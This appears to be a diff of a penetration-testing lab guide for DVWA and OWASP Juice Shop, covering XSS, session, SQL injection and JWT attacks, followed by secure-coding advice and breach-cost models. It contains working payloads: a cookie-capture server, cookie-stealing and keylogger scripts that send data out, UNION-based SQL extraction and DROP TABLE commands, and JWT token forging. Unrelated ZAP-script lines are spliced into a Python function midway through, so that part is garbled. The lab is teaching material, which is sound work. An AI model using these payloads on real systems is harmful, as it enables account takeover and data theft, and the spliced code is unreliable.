-### Objective and Learning Outcomes
-**Primary Objective**: Demonstrate XSS vulnerability exploitation leading to session hijacking and account compromise.
-
-**Learning Outcomes**:
-- Identify reflected and stored XSS vulnerabilities
-- Develop custom JavaScript payloads for various attack scenarios
-- Execute session hijacking attacks
-- Assess business impact of XSS exploitation
-
-### Business Impact Scenario
-*"TechStart Inc., a SaaS provider with 50,000 active users, experiences a sophisticated XSS attack in their customer support portal. An attacker injects malicious JavaScript that steals session cookies when support staff view customer tickets. Over 48 hours, 200 support staff sessions are compromised, leading to unauthorized access to 15,000 customer accounts. The incident costs $3.2M in incident response, $2.8M in customer compensation, $1.5M in system remediation, and results in 12% customer churn worth $8.4M in annual recurring revenue."*
-
-### Pre-Laboratory Setup
-```bash
-# Set up cookie capture server
-mkdir /tmp/xss_lab
-cd /tmp/xss_lab
-
-# Create simple HTTP server for cookie collection
-cat > cookie_capture.py << 'EOF'
-#!/usr/bin/env python3
-import http.server
-import socketserver
-from urllib.parse import urlparse, parse_qs
-import datetime
-
-class CookieHandler(http.server.SimpleHTTPRequestHandler):
-    def do_GET(self):
-        parsed_url = urlparse(self.path)
-        query_params = parse_qs(parsed_url.query)
-        
-        if 'cookie' in query_params:
-            timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
-            cookie_data = query_params['cookie'][0]
-            print(f"[{timestamp}] Captured cookie: {cookie_data}")
-            
-            with open('captured_cookies.txt', 'a') as f:
-                f.write(f"[{timestamp}] {cookie_data}\n")
-        
-        self.send_response(200)
-        self.send_header('Content-type', 'text/html')
-        self.end_headers()
-        self.wfile.write(b'Cookie captured!')
-
-PORT = 8000
-with socketserver.TCPServer(("", PORT), CookieHandler) as httpd:
-    print(f"Cookie capture server running on port {PORT}")
-    httpd.serve_forever()
-EOF
-
-chmod +x cookie_capture.py
-```
-
-### Step-by-Step Testing Procedure
-
-**Step 1: Reflected XSS Testing**
-1. Navigate to: `http://127.0.0.1/dvwa/vulnerabilities/xss_r/`
-2. Test basic XSS payload:
-```javascript
-<script>alert('XSS Vulnerability Confirmed')</script>
-```
-
-3. Advanced payload testing:
-```javascript
-<!-- Cookie stealing payload -->
-<script>
-new Image().src = "http://127.0.0.1:8000/?cookie=" + encodeURIComponent(document.cookie);
-</script>
-
-<!-- Keylogger payload -->
-<script>
-document.addEventListener('keypress', function(e) {
-    new Image().src = "http://127.0.0.1:8000/?key=" + encodeURIComponent(e.key);
-});
-</script>
-
-<!-- Session hijacking payload -->
-<script>
-if (document.cookie.includes('PHPSESSID')) {
-    window.location = "http://127.0.0.1:8000/?session=" + encodeURIComponent(document.cookie);
-}
-</script>
-```
-
-**Step 2: Stored XSS Testing**
-1. Navigate to: `http://127.0.0.1/dvwa/vulnerabilities/xss_s/`
-2. Test persistent XSS in comment field:
-```javascript
-<script>
-// Persistent cookie stealer
-var stolen = document.cookie;
-var xhr = new XMLHttpRequest();
-xhr.open('GET', 'http://127.0.0.1:8000/?stored_cookie=' + encodeURIComponent(stolen), true);
-xhr.send();
-</script>
-```
-
-**Step 3: Session Hijacking Demonstration**
-1. Start cookie capture server:
-```bash
-python3 cookie_capture.py &
-```
-
-2. Execute XSS payload to steal admin session
-3. Capture session cookie from server logs
-4. Use captured session in new browser:
-```javascript
-// In browser console, set stolen cookie
-document.cookie = "PHPSESSID=captured_session_id; path=/";
-```
-
-5. Demonstrate unauthorized access to admin functionality
-
-### Business Impact Analysis
-
-```
-Technical Impact:
-┌─────────────────────────────┬───────────────────┐
-│ Sessions compromised        │ 200 support staff │
-│ User accounts accessed      │ 15,000 customers  │
-│ Data exposure               │ Names, emails,    │
-│                             │ support tickets   │
-│ System downtime             │ 12 hours          │
-└─────────────────────────────┴───────────────────┘
-
-Financial Impact:
-┌─────────────────────────────┬──────────────────┐
-│ Incident response           │ $3,200,000       │
-│ Customer compensation       │ $2,800,000       │
-│ System remediation          │ $1,500,000       │
-│ Legal and regulatory        │ $800,000         │
-│ Customer churn (12%)        │ $8,400,000       │
-├─────────────────────────────┼──────────────────┤
-│ TOTAL IMPACT                │ $16,700,000      │
-└─────────────────────────────┴──────────────────┘
-```
-
-## DVWA Broken Session Management Testing
-
-### Objective and Learning Outcomes
-**Primary Objective**: Identify and exploit session management vulnerabilities leading to unauthorized account access.
-
-**Learning Outcomes**:
-- Analyze session token generation and management
-- Identify session fixation and prediction vulnerabilities
-- Execute session hijacking attacks
-- Assess authentication bypass techniques
-
-### Business Impact Scenario
-*"SecureBank's online banking platform serves 1.2 million customers with $45 billion in managed assets. A session management vulnerability allows attackers to predict session tokens and gain unauthorized access to customer accounts. Over a weekend, 500 accounts are compromised, resulting in $2.3 million in fraudulent transfers, $15 million in regulatory fines, $25 million in customer restitution, and $180 million in asset withdrawals as customers lose confidence in the platform's security."*
-
-### Session Analysis Methodology
-
-**Step 1: Session Token Collection and Analysis**
-```bash
-# Create session analysis directory
-mkdir /tmp/session_analysis
-cd /tmp/session_analysis
-
-# Session collection script
-cat > collect_sessions.py << 'EOF'
-#!/usr/bin/env python3
-import requests
-import time
-import statistics
-
-def collect_session_tokens(url, num_sessions=50):
-    sessions = []
-    for i in range(num_sessions):
-        response = requests.get(url)
-        if 'Set-Cookie' in response.headers:
-            cookie_header = response.headers['Set-Cookie']
-            if 'PHPSESSID=' in cookie_header:
-                session_id = cookie_header.split('PHPSESSID=')[1].split(';')[0]
-                sessions.append(session_id)
-                print(f"Session {i+1}: {session_id}")
-        time.sleep(1)
-    return sessions
-
-# Collect sessions from DVWA
-url = "http://127.0.0.1/dvwa/login.php"
-print("Collecting session tokens...")
-session_tokens = collect_session_tokens(url, 25)
-
-print(f"\nAnalyzing {len(session_tokens)} session tokens...")
-# Additional analysis code here
-EOF
-
-chmod +x collect_sessions.py
-```
-
-**Step 2: Session Fixation Testing**
-```bash
-# Get initial session
-curl -c cookies.txt http://127.0.0.1/dvwa/login.php
-grep PHPSESSID cookies.txt
-
-# Check session after login
-curl -b cookies.txt -c cookies_after.txt -d "username=admin&password=password&Login=Login" http://127.0.0.1/dvwa/login.php
-grep PHPSESSID cookies_after.txt
-```
-
-### Business Impact Quantification
-
-```
-Direct Fraud Losses:
-┌─────────────────────────────┬──────────────────┐
-│ Unauthorized transfers      │ $2,300,000       │
-│ Account takeover costs      │ $1,200,000       │
-│ Fraud investigation         │ $800,000         │
-├─────────────────────────────┼──────────────────┤
-│ Subtotal                    │ $4,300,000       │
-└─────────────────────────────┴──────────────────┘
-
-Regulatory and Legal:
-┌─────────────────────────────┬──────────────────┐
-│ Regulatory fines            │ $15,000,000      │
-│ Legal fees                  │ $3,500,000       │
-│ Compliance remediation      │ $2,200,000       │
-├─────────────────────────────┼──────────────────┤
-│ Subtotal                    │ $20,700,000      │
-└─────────────────────────────┴──────────────────┘
-
-Customer Impact:
-┌─────────────────────────────┬──────────────────┐
-│ Restitution payments        │ $25,000,000      │
-│ Customer notification       │ $1,800,000       │
-│ Credit monitoring           │ $3,200,000       │
-│ Asset withdrawals           │ $180,000,000     │
-├─────────────────────────────┼──────────────────┤
-│ Subtotal                    │ $210,000,000     │
-└─────────────────────────────┴──────────────────┘
-
-TOTAL ESTIMATED IMPACT: $235,000,000
-```
-
----
-
-# 🧃 OWASP Juice Shop Penetration Testing
-
-## Initial Juice Shop Reconnaissance
-
-### Step 1: Application Mapping
-```bash
-# Use Burp Suite to map Juice Shop API
-# Start Burp and configure browser proxy to 127.0.0.1:8080
-
-# Navigate through application to discover endpoints
-# Key endpoints to analyze:
-# POST /rest/user/login
-# GET /rest/products/search
-# GET /rest/user/whoami
-# POST /rest/user/data-export
-```
-
-### Step 2: Nikto Scanning of Juice Shop
-```bash
-# Run Nikto scan on Juice Shop
-nikto -h http://localhost:3000 -o juiceshop_nikto_scan.html -Format htm
-```
-
-## Juice Shop Modern SQL Injection Testing
-
-### Objective and Learning Outcomes
-**Primary Objective**: Exploit SQL injection vulnerabilities in a modern JavaScript/Node.js application with SQLite backend.
-
-**Learning Outcomes**:
-- Identify NoSQL and traditional SQL injection in modern frameworks
-- Understand ORM injection techniques
-- Exploit JSON-based parameter injection
-- Assess cloud-scale application vulnerabilities
-
-### Business Impact Scenario
-*"CloudCommerce, a modern e-commerce platform built on Node.js serving 2.8 million customers globally with $2.1 billion in annual transactions, suffers a sophisticated SQL injection attack through their REST API endpoints. Attackers exploit parameterized queries in the user authentication system and product search functionality, extracting complete customer databases including encrypted payment tokens, personal information, and purchase histories. The breach affects 2.8 million users across 47 countries, resulting in $89 million in regulatory fines, $156 million in legal settlements, $45 million in system remediation, and $890 million in lost business over 18 months."*
-
-### Advanced Testing Procedures
-
-**Step 1: Authentication Bypass Testing**
-1. Navigate to login page: `http://localhost:3000/#/login`
-2. Test SQL injection in login form:
-```json
-{
-  "email": "admin@juice-sh.op'--",
-  "password": "anything"
-}
-
-{
-  "email": "admin@juice-sh.op' OR '1'='1'--",
-  "password": "password"
-}
-
-{
-  "email": "' UNION SELECT * FROM Users--",
-  "password": "password"
-}
-```
-
-**Step 2: Product Search Injection**
-```bash
-# Test search endpoint with SQLite-specific payloads
-curl -X GET "http://localhost:3000/rest/products/search?q=apple'; DROP TABLE Products;--"
-
-# SQLite version detection
-curl -X GET "http://localhost:3000/rest/products/search?q=apple' UNION SELECT sqlite_version(),1,1,1,1,1,1,1,1--"
-
-# Table enumeration
-curl -X GET "http://localhost:3000/rest/products/search?q=apple' UNION SELECT name,sql,1,1,1,1,1,1,1 FROM sqlite_master WHERE type='table'--"
-```
-
-**Step 3: Advanced Data Extraction**
-```bash
-# Extract user data with complete schema
-curl -X GET "http://localhost:3000/rest/products/search?q=apple' UNION SELECT email,password,role,1,1,1,1,1,1 FROM Users--"
-
-# Extract customer addresses
-curl -X GET "http://localhost:3000/rest/products/search?q=apple' UNION SELECT fullName,mobileNumber,zipCode,1,1,1,1,1,1 FROM Addresses--"
-
-# Extract order information
-curl -X GET "http://localhost:3000/rest/products/search?q=apple' UNION SELECT email,totalPrice,delivered,1,1,1,1,1,1 FROM Orders JOIN Users ON Orders.UserId = Users.id--"
-```
-
-### Business Impact Analysis for Modern Applications
-
-**Cloud-Scale Impact Assessment**:
-- Database records compromised: 2.8 million users
-- Geographic scope: 47 countries
-- Transaction data exposed: $2.1 billion in annual volume
-- API endpoints vulnerable: 12 critical endpoints
-
-**Modern Application Specific Risks**:
-
-## Microservices Impact Assessment
-
-| **Microservices Component** | **Impact Description** |
-|------------------------------|------------------------|
-| 🔐 **Authentication service** | Complete user base compromise |
-| 💳 **Payment processing** | Credit card token exposure |
-| 🎯 **Recommendation engine** | User behavior profile theft |
-| 📦 **Inventory management** | Supplier information disclosure |
-
-## API Security Failures
-
-| **API Security Vulnerability** | **Attack Vector Description** |
-|---------------------------------|--------------------------------|
-| 🌐 **REST endpoint injection** | 12 vulnerable endpoints |
-| 📊 **GraphQL injection potential** | Query complexity attacks |
-| 🔄 **JSON parameter pollution** | Data type confusion |
-| 🗄️ **NoSQL injection** | Document database compromise |
-
-## Juice Shop Advanced XSS Testing
-
-### Modern XSS Attack Vectors
-
-**Step 1: Client-Side Template Injection**
-```javascript
-// Angular template injection in search
-{{constructor.constructor('alert(1)')()}}
-
-// Vue.js template injection
-{{this.constructor.constructor('alert("XSS")')()}}
-
-// React XSS through dangerouslySetInnerHTML
-<img src=x onerror="alert('React XSS')">
-```
-
-**Step 2: Service Worker Manipulation**
-```javascript
-// Register malicious service worker
-navigator.serviceWorker.register('data:application/javascript,self.addEventListener("fetch",function(e){console.log("Service Worker XSS")});');
-```
-
-**Step 3: WebSocket XSS**
-```javascript
-// XSS through WebSocket messages
-var ws = new WebSocket('ws://localhost:3000');
-ws.onopen = function() {
-    ws.send(JSON.stringify({
-        message: '<script>alert("WebSocket XSS")</script>',
-        user: 'attacker'
-    }));
-};
-```
-
-## Juice Shop JWT Authentication Attacks
-
-### JWT Token Analysis and Manipulation
-
-**Step 1: JWT Token Extraction and Analysis**
-```bash
-# Login and capture JWT token
-curl -X POST http://localhost:3000/rest/user/login \
-  -H "Content-Type: application/json" \
-  -d '{"email":"admin@juice-sh.op","password":"admin123"}' \
-  -c cookies.txt
-
-# Decode JWT components
-cat > decode_jwt.py << 'EOF'
-#!/usr/bin/env python3
-import base64
-import json
-import sys
-
-def decode_jwt_component(component):
-    # Add padding if necessary
-    component += '=' * (4 - len(component) % 4)
-    try:
-        decoded = base64.urlsafe_b64decode(component)
-        return json.loads(decoded.decode('utf-8'))
-    except:
-        return base64.urlsafe_b64decode(component).decode('utf-8')
-
-if len(sys.argv) != 2:
-    print("Usage: python3 decode_jwt.py <jwt_token>")
-    sys.exit(1)
-
-jwt_token = sys.argv[1]
-parts = jwt_token.split('.')
-
-if len(parts) != 3:
-    print("Invalid JWT token format")
-    sys.exit(1)
-
-header = decode_jwt_component(parts[0])
-payload = decode_jwt_component(parts[1])
-signature = parts[2]
-
-print("JWT Header:")
-print(json.dumps(header, indent=2))
-print("\nJWT Payload:")
-print(json.dumps(payload, indent=2))
-print(f"\nSignature: {signature}")
-EOF
-
-chmod +x decode_jwt.py
-```
-
-**Step 2: JWT Vulnerability Testing**
-```bash
-# Test algorithm confusion attack
-# Test null signature
-# Test key confusion
-
-cat > jwt_attacks.py << 'EOF'
-#!/usr/bin/env python3
-import jwt
-import json
-
-def test_algorithm_confusion(token):
-    try:
-        # Decode without verification to get payload
-        payload = jwt.decode(token, options={"verify_signature": False})
-        
-        # Create new token with none algorithm
-        none_token = jwt.encode(payload, "", algorithm="none")
-        print(f"None algorithm token: {none_token}")
-        
-        # Create token with weak secret
-        weak_token = jwt.encode(payload, "secret", algorithm="HS256")
-        print(f"Weak secret token: {weak_token}")
-        
-        return none_token, weak_token
-    except Exception as e:
-        print(f"Error: {e}")
-        return None, None
-EOF
-```
-
-### Business Impact Assessment
-
-## Financial Impact Assessment
-
-| **Financial Impact Category** | **Impact Description** |
-|-------------------------------|------------------------|
-| 💰 **Unauthorized transactions** | $15,000,000 |
-| 📊 **Data exfiltration** | 500,000 customer records |
-| ⚙️ **System manipulation** | Price changes, inventory theft |
-| ⚖️ **Compliance violations** | GDPR, PCI-DSS, SOX |
-
-## Operational Impact Assessment
-
-| **Operational Impact Category** | **Impact Description** |
-|---------------------------------|------------------------|
-| 🚫 **Service disruption** | 24-hour platform outage |
-| 📉 **Customer trust erosion** | 25% user churn |
-| 🔍 **Regulatory investigation** | 18-month compliance audit |
-| 🔧 **System rebuild** | $8,500,000 security overhaul |
-
----
-
-# 📊 Testing Results and Analysis
-
-## DVWA Testing Results Summary
-
-### SQL Injection Testing Results
-
-| **Test Case** | **Result** |
-|---------------|------------|
-| 🔍 **Boolean-based injection** | [ ] **SUCCESSFUL** - All records retrieved |
-| ⚠️ **Error-based injection** | [ ] **SUCCESSFUL** - Database structure exposed |
-| 🔗 **Union-based injection** | [ ] **SUCCESSFUL** - Data extraction possible |
-| 📁 **File system access** | [ ] **PARTIAL** - Depends on permissions |
-| 🐚 **Web shell upload** | [ ] **PARTIAL** - Directory writable |
-
-### XSS Testing Results
-
-| **Test Case** | **Result** |
-|---------------|------------|
-| 🔄 **Reflected XSS** | [ ] **SUCCESSFUL** - Script execution |
-| 💾 **Stored XSS** | [ ] **SUCCESSFUL** - Persistent payload |
-| 🍪 **Cookie stealing** | [ ] **SUCCESSFUL** - Session tokens captured |
-| 🔐 **Session hijacking** | [ ] **SUCCESSFUL** - Admin access gained |
-| 🎨 **DOM manipulation** | [ ] **SUCCESSFUL** - Page defacement |
-
-## Session Management Testing Results
-
-| **Test Case** | **Result** |
-|---------------|------------|
-| 🔗 **Session fixation** | [ ] **VULNERABLE** - Session ID unchanged |
-| 🎲 **Session prediction** | [ ] **MEDIUM** - Some randomness present |
-| ⏰ **Session timeout** | [ ] **WEAK** - Extended timeout period |
-| 🔄 **Session regeneration** | [ ] **MISSING** - No regeneration on login |
-| 🍪 **Secure cookie flags** | [ ] **MISSING** - HTTP-only not set |
-
-## OWASP Juice Shop Testing Results Summary
-
-### Modern SQL Injection Results
-
-| **Test Case** | **Result** |
-|---------------|------------|
-| 🚪 **Authentication bypass** | [ ] **SUCCESSFUL** - Admin access gained |
-| 🗄️ **SQLite injection** | [ ] **SUCCESSFUL** - Database enumeration |
-| 🌐 **API endpoint injection** | [ ] **SUCCESSFUL** - Multiple endpoints |
-| 🔄 **JSON parameter pollution** | [ ] **SUCCESSFUL** - Data type confusion |
-| 🛡️ **ORM injection** | [ ] **PARTIAL** - Some protections present |
-
-### Modern XSS Results
-
-| **Test Case** | **Result** |
-|---------------|------------|
-| 📝 **Template injection** | [ ] **SUCCESSFUL** - Angular/Vue bypass |
-| ⚙️ **Service Worker manipulation** | [ ] **SUCCESSFUL** - Background execution |
-| 🔌 **WebSocket XSS** | [ ] **SUCCESSFUL** - Real-time communication |
-| 🛡️ **CSP bypass** | [ ] **PARTIAL** - Some restrictions active |
-| 🌐 **DOM clobbering** | [ ] **SUCCESSFUL** - Global object pollution |
-
-### JWT Authentication Results
-
-| **Test Case** | **Result** |
-|---------------|------------|
-| 🔀 **Algorithm confusion** | [ ] **SUCCESSFUL** - None algorithm accepted |
-| 🔑 **Weak secret exploitation** | [ ] **SUCCESSFUL** - Predictable key |
-| 🎭 **Token manipulation** | [ ] **SUCCESSFUL** - Role elevation |
-| ✍️ **Signature bypass** | [ ] **SUCCESSFUL** - Verification disabled |
-| ⏱️ **Expiration bypass** | [ ] **PARTIAL** - Some validation present |
-
----
-
-# 🔧 Alternative Solutions and Recommendations
-
-## SQL Injection Prevention
-
-### Secure Coding Practices
-```sql
--- ✅ Correct: Parameterized queries
-SELECT * FROM users WHERE id = ? AND status = ?
-
--- ❌ Incorrect: String concatenation
-SELECT * FROM users WHERE id = '" + userId + "' AND status = '" + status + "'"
-
--- Input validation example
-if (!is_numeric($user_id)) {
-    throw new InvalidArgumentException("User ID must be numeric");
-}
-```
-
-### Database Security Measures
-```bash
-# Database hardening for MySQL/MariaDB
-sudo mysql_secure_installation
-
-# Create limited privilege user for application
-CREATE USER 'webapp'@'localhost' IDENTIFIED BY 'strong_password';
-GRANT SELECT, INSERT, UPDATE ON webapp_db.* TO 'webapp'@'localhost';
-FLUSH PRIVILEGES;
-```
-
-## XSS Prevention Techniques
-
-### Output Encoding Implementation
-```javascript
-// ✅ Output encoding function
-function htmlEncode(input) {
-    const entityMap = {
-        '&': '&amp;',
-        '<': '&lt;',
-        '>': '&gt;',
-        '"': '&quot;',
-        "'": '&#x27;',
-        '/': '&#x2F;'
-    };
-    return input.replace(/[&<>"'\/]/g, match => entityMap[match]);
-}
-
-// ✅ Content Security Policy header
-app.use((req, res, next) => {
-    res.setHeader('Content-Security-Policy', 
-        "default-src 'self'; script-src 'self' 'unsafe-inline'");
-    next();
-});
-```
-
-### Input Validation and Sanitization
-```php
-// ✅ Input sanitization
-$clean_input = filter_var($user_input, FILTER_SANITIZE_STRING);
-$clean_input = htmlspecialchars($clean_input, ENT_QUOTES, 'UTF-8');
-```
-
-## Session Security Implementation
-
-### Secure Session Configuration
-```php
-// ✅ Secure session configuration
-ini_set('session.cookie_httponly', 1);
-ini_set('session.cookie_secure', 1);
-ini_set('session.cookie_samesite', 'Strict');
-ini_set('session.use_strict_mode', 1);
-ini_set('session.gc_maxlifetime', 1800); // 30 minutes
-
-// Session regeneration after authentication
-session_regenerate_id(true);
-
-// Session timeout validation
-if (isset($_SESSION['last_activity']) && 
-    (time() - $_SESSION['last_activity'] > 1800)) {
-    session_destroy();
-    header('Location: login.php');
-    exit();
-}
-$_SESSION['last_activity'] = time();
-```
-
-### JWT Security Best Practices
-```javascript
-// ✅ Secure JWT implementation
-const jwt = require('jsonwebtoken');
-const crypto = require('crypto');
-
-// Use strong secret key
-const secretKey = crypto.randomBytes(64).toString('hex');
-
-// Generate secure token
-const token = jwt.sign(
-    { 
-        userId: user.id, 
-        role: user.role,
-        exp: Math.floor(Date.now() / 1000) + 3600 // 1 hour
-    },
-    secretKey,
-    { algorithm: 'HS256' }
-);
-
-// Verify token with proper error handling
-function verifyToken(token) {
-    try {
-        return jwt.verify(token, secretKey);
-    } catch (error) {
-        throw new Error('Invalid token');
-    }
-}
-```
-
----
-
-# 📈 Business Impact Models and Implementation
-
-## FAIR (Factor Analysis of Information Risk) Model
-
-### Model Explanation
-The FAIR model provides a quantitative framework for understanding, analyzing, and measuring information risk. It breaks down risk into two primary factors: the probability of an event occurring and the magnitude of impact if it does occur.
-
-### FAIR Model Components
-
-```
-Risk Calculation Framework:
-┌─────────────────────────────────────────────────────────────────┐
-│                        FAIR Risk Model                          │
-├─────────────────────────────────────────────────────────────────┤
-│                                                                 │
-│  Risk = Threat Event Frequency × Vulnerability × Asset Value    │
-│                                                                 │
-│  Where:                                                         │
-│  • Threat Event Frequency = Attack attempts per year            │
-│  • Vulnerability = Probability of successful exploitation       │
-│  • Asset Value = Financial value of compromised asset           │
-│                                                                 │
-└─────────────────────────────────────────────────────────────────┘
-```
-
-### Step-by-Step Implementation
-
-**Step 1: Asset Valuation**
-```python
-def calculate_asset_value(data_records, avg_record_value, regulatory_multiplier):
-    """
-    Calculate total asset value considering data records and regulatory impact
-    """
-    base_value = data_records * avg_record_value
-    regulatory_impact = base_value * regulatory_multiplier
-    total_asset_value = base_value + regulatory_impact
+    target_url = sys.argv[1]
+    output_dir = sys.argv[2]
     
-    return {
-        'base_value': base_value,
-        'regulatory_impact': regulatory_impact,
-        'total_value': total_asset_value
-    }
-
-# Example calculation
-customer_records = 500000
-avg_record_value = 150  # Average value per customer record
-regulatory_multiplier = 0.25  # 25% additional for regulatory fines
-
-asset_value = calculate_asset_value(customer_records, avg_record_value, regulatory_multiplier)
-print(f"Total asset value: ${asset_value['total_value']:,.2f}")
-```
-
-**Step 2: Threat Event Frequency Assessment**
-```python
-def assess_threat_frequency(industry_type, company_size, security_posture):
-    """
-    Assess threat event frequency based on company characteristics
-    """
-    base_frequency = {
-        'financial': 24,      # 24 attempts per year
-        'healthcare': 18,     # 18 attempts per year
-        'retail': 15,         # 15 attempts per year
-        'government': 30,     # 30 attempts per year
-        'technology': 20      # 20 attempts per year
-    }
+    if not os.path.exists(output_dir):
+        os.makedirs(output_dir)
     
-    size_multiplier = {
-        'small': 0.7,         # Smaller companies targeted less
-        'medium': 1.0,        # Baseline
-        'large': 1.3,         # Larger companies targeted more
-        'enterprise': 1.6     # Enterprise heavily targeted
-    }
+    print("🔬 Starting ZAP validation scan...")
+    alerts = run_zap_validation(target_url, output_dir)
     
-    security_modifier = {
-        'poor': 1.5,          # Poor security = more attempts
-        'average': 1.0,       # Baseline
-        'good': 0.7,          # Good security deters some attacks
-        'excellent': 0.5      # Excellent security deters many
-    }
+    print(f"🔍 Found {len(alerts)} vulnerabilities")
+    print("📝 Generating enhanced validation report...")
     
-    frequency = (base_frequency.get(industry_type, 15) * 
-                size_multiplier.get(company_size, 1.0) * 
-                security_modifier.get(security_posture, 1.0))
+    generate_validation_html_report(alerts, target_url, f'{output_dir}/validation_report.html')
     
-    return frequency
-
-# Example assessment
-threat_freq = assess_threat_frequency('financial', 'large', 'average')
-print(f"Estimated threat event frequency: {threat_freq:.1f} per year")
-```
-
-**Step 3: Vulnerability Assessment**
-```python
-def calculate_vulnerability_score(technical_controls, process_controls, awareness_level):
-    """
-    Calculate vulnerability score based on security controls
-    """
-    # Technical controls (0.0 to 1.0, lower is better)
-    tech_score = {
-        'none': 0.9,
-        'basic': 0.7,
-        'standard': 0.5,
-        'advanced': 0.3,
-        'comprehensive': 0.1
-    }
-    
-    # Process controls (0.0 to 1.0, lower is better)
-    process_score = {
-        'none': 0.8,
-        'basic': 0.6,
-        'standard': 0.4,
-        'mature': 0.2,
-        'optimized': 0.1
-    }
-    
-    # Awareness level (0.0 to 1.0, lower is better)
-    awareness_score = {
-        'none': 0.9,
-        'basic': 0.7,
-        'good': 0.5,
-        'excellent': 0.3
-    }
-    
-    # Weighted average (technical controls have highest impact)
-    vulnerability = (tech_score.get(technical_controls, 0.7) * 0.5 +
-                    process_score.get(process_controls, 0.6) * 0.3 +
-                    awareness_score.get(awareness_level, 0.7) * 0.2)
-    
-    return vulnerability
-
-# Example vulnerability assessment
-vuln_score = calculate_vulnerability_score('standard', 'basic', 'good')
-print(f"Vulnerability score: {vuln_score:.2f}")
-```
-
-**Step 4: Complete Risk Calculation**
-```python
-def calculate_fair_risk(asset_value, threat_frequency, vulnerability, loss_magnitude=0.6):
-    """
-    Calculate complete FAIR risk assessment
-    """
-    # Annual Loss Expectancy calculation
-    ale = asset_value * threat_frequency * vulnerability * loss_magnitude
-    
-    # Risk categorization
-    if ale >= 10000000:  # $10M+
-        risk_level = "Critical"
-    elif ale >= 1000000:  # $1M+
-        risk_level = "High"
-    elif ale >= 100000:   # $100K+
-        risk_level = "Medium"
-    else:
-        risk_level = "Low"
-    
-    return {
-        'annual_loss_expectancy': ale,
-        'risk_level': risk_level,
-        'components': {
-            'asset_value': asset_value,
-            'threat_frequency': threat_frequency,
-            'vulnerability': vulnerability,
-            'loss_magnitude': loss_magnitude
-        }
-    }
-
-# Complete FAIR assessment
-fair_risk = calculate_fair_risk(
-    asset_value=75000000,  # $75M asset value
-    threat_frequency=20.8,  # ~21 attempts per year
-    vulnerability=0.52,     # 52% chance of success
-    loss_magnitude=0.6      # 60% of asset value lost
-)
-
-print(f"Annual Loss Expectancy: ${fair_risk['annual_loss_expectancy']:,.2f}")
-print(f"Risk Level: {fair_risk['risk_level']}")
-```
-
-## Customer Churn Impact Model
-
-### Model Explanation
-This model calculates the financial impact of customer churn following a security incident, considering different churn rates over time and the diminishing value of customer relationships.
-
-### Churn Model Implementation
-
-```python
-def calculate_customer_churn_impact(customers_affected, avg_customer_value, churn_rates):
-    """
-    Calculate financial impact of customer churn following security incident
-    """
-    immediate_churn = churn_rates['immediate']  # 0-30 days
-    short_term_churn = churn_rates['short_term']  # 30-90 days
-    long_term_churn = churn_rates['long_term']  # 90-365 days
-    
-    # Calculate customers lost in each period
-    immediate_lost = customers_affected * immediate_churn
-    remaining_after_immediate = customers_affected - immediate_lost
-    
-    short_term_lost = remaining_after_immediate * short_term_churn
-    remaining_after_short = remaining_after_immediate - short_term_lost
-    
-    long_term_lost = remaining_after_short * long_term_churn
-    
-    # Calculate revenue impact with diminishing recovery potential
-    immediate_impact = immediate_lost * avg_customer_value
-    short_term_impact = short_term_lost * avg_customer_value * 0.8  # 80% value
-    long_term_impact = long_term_lost * avg_customer_value * 0.6   # 60% value
-    
-    total_churn_impact = immediate_impact + short_term_impact + long_term_impact
-    
-    return {
-        'customers_lost': immediate_lost + short_term_lost + long_term_lost,
-        'revenue_impact': total_churn_impact,
-        'breakdown': {
-            'immediate': immediate_impact,
-            'short_term': short_term_impact,
-            'long_term': long_term_impact
-        },
-        'recovery_potential': {
-            'high': immediate_lost * 0.1,      # 10% might return quickly
-            'medium': short_term_lost * 0.25,  # 25% might return eventually
-            'low': long_term_lost * 0.05       # 5% might return long-term
-        }
-    }
-
-# Example e-commerce breach scenario
-customers_affected = 500000
-avg_customer_value = 450  # Annual customer value
-churn_rates = {
-    'immediate': 0.15,    # 15% churn in first 30 days
-    'short_term': 0.12,   # 12% additional churn in next 60 days
-    'long_term': 0.08     # 8% additional churn over remainder of year
-}
-
-churn_impact = calculate_customer_churn_impact(customers_affected, avg_customer_value, churn_rates)
-
-print("Customer Churn Impact Analysis:")
-print(f"Total customers lost: {churn_impact['customers_lost']:,.0f}")
-print(f"Total revenue impact: ${churn_impact['revenue_impact']:,.2f}")
-print(f"Immediate impact: ${churn_impact['breakdown']['immediate']:,.2f}")
-print(f"Short-term impact: ${churn_impact['breakdown']['short_term']:,.2f}")
-print(f"Long-term impact: ${churn_impact['breakdown']['long_term']:,.2f}")
-```
-
-## Regulatory Compliance Cost Model
-
-### GDPR Fine Calculation Implementation
-
-```python
-def calculate_gdpr_fine(annual_turnover, affected_records, violation_type, mitigating_factors=None):
-    """
-    Calculate potential GDPR fine based on violation characteristics
-    """
-    if mitigating_factors is None:
-        mitigating_factors = {}
-    
-    # Article 83 base fine calculations
-    severity_multiplier = {
-        'data_breach': 0.02,           # 2% of turnover
-        'consent_violation': 0.015,    # 1.5% of turnover
-        'data_subject_rights': 0.01,   # 1% of turnover
-        'technical_measures': 0.025,   # 2.5% of turnover
-        'processing_principles': 0.02   # 2% of turnover
-    }
-    
-    base_fine = annual_turnover * severity_multiplier.get(violation_type, 0.02)
-    
-    # Mitigating factors (Article 83(2)(a-k))
-    cooperation_discount = 1.0 - mitigating_factors.get('cooperation_level', 0) * 0.3
-    remediation_discount = 1.0 - mitigating_factors.get('remediation_speed', 0) * 0.2
-    first_violation_discount = 1.0 - mitigating_factors.get('first_violation', 0) * 0.3
-    
-    # Aggravating factors
-    if affected_records > 10000000:  # 10M+ records
-        scale_multiplier = 1.8
-    elif affected_records > 1000000:  # 1M+ records
-        scale_multiplier = 1.5
-    elif affected_records > 100000:   # 100K+ records
-        scale_multiplier = 1.2
-    else:
-        scale_multiplier = 1.0
-    
-    # Apply all factors
-    calculated_fine = (base_fine * 
-                      cooperation_discount * 
-                      remediation_discount * 
-                      first_violation_discount * 
-                      scale_multiplier)
-    
-    # Cap at €20M or 4% of turnover, whichever is higher
-    max_fine_amount = max(20000000, annual_turnover * 0.04)
-    final_fine = min(calculated_fine, max_fine_amount)
-    
-    return {
-        'base_fine': base_fine,
-        'calculated_fine': calculated_fine,
-        'final_fine': final_fine,
-        'factors': {
-            'cooperation_discount': cooperation_discount,
-            'remediation_discount': remediation_discount,
-            'first_violation_discount': first_violation_discount,
-            'scale_multiplier': scale_multiplier
-        }
-    }
-
-# Example GDPR fine calculation
-annual_turnover = 500000000  # €500M annual turnover
